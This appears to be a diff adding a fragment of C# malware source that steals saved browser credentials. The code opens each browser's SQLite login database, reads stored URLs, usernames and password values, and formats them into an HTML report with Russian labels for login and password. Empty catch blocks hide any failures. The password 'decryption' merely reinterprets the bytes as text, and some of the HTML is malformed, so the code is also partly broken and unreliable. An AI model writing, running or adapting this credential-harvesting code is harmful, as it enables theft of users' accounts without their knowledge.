@@ -1,0 +1,37 @@
+ for (int y = 0; y < Browsers.Count; y++)
+            {
+                try
+                {
+                    if (File.Exists(Browsers[y]))
+                    {
+                        using (SQLiteConnection connect = new SQLiteConnection("Data Source=" + Browsers[y] + ";Version=3;New=True;Compress=True;"))
+                        {
+                            using (SQLiteCommand cmd = connect.CreateCommand())
+                            {
+                                cmd.CommandText = "select Origin_URL, Username_value, Password_value from logins";
+                                connect.Open();
+                                using (var reader = cmd.ExecuteReader())
+                                {
+                                    while (reader.Read())
+                                    {
+                                        try
+                                        {
+                                            string Url = (string)reader["Origin_URL"];
+                                            string UserName = (string)reader["Username_value"];
+                                            byte[] DecryptPassword = (byte[])reader["Password_value"];
+                                            string password = new UTF8Encoding(true).GetString(DecryptPassword);
+                                            htm.AppendFormat("<td style=\"color:#85AB70; width:33.3%; border:2px solid #707070; text-align: center\"><div style=\"height: 31px;line-height: 31px\"><a title=\"Порядковый номер: {0}.\"<center>{0}</center></p></div></td>", ff);
+                                            htm.AppendFormat("<td style=\"width:33.3%; border:2px solid #707070; text-align: center\"><div style=\"height: 31px;line-height: 31px\"><a title=\"Кликните по ссылке чтобы перейти на сайт.\"<a href='{0}' class=\"link\" target='_blank'<p align=\"center\"><center>{0}</a></p></div></td>", Url);
+                                            htm.AppendFormat("<td style=\"color:#85AB70; width:33.3%; border:2px solid #707070; text-align: center\"><div style=\"height: 31px;line-height: 31px\"><a title=\"Логин пользователя.\"<center>{0}</a></p></div></td>", UserName);
+                                            htm.AppendFormat("<td style=\"color:#85AB70; width:33.3%; border:2px solid #707070; text-align: center\"><div style=\"height: 31px;line-height: 31px\"><a title=\"Пароль пользователя.\"<center>{0}</a></p></div></td></tr>", password);
+
+                                        }
+                                        catch { }
+                                    }
+
+                                }
+                            }
+                        }
+                    }
+                }
+                catch { }
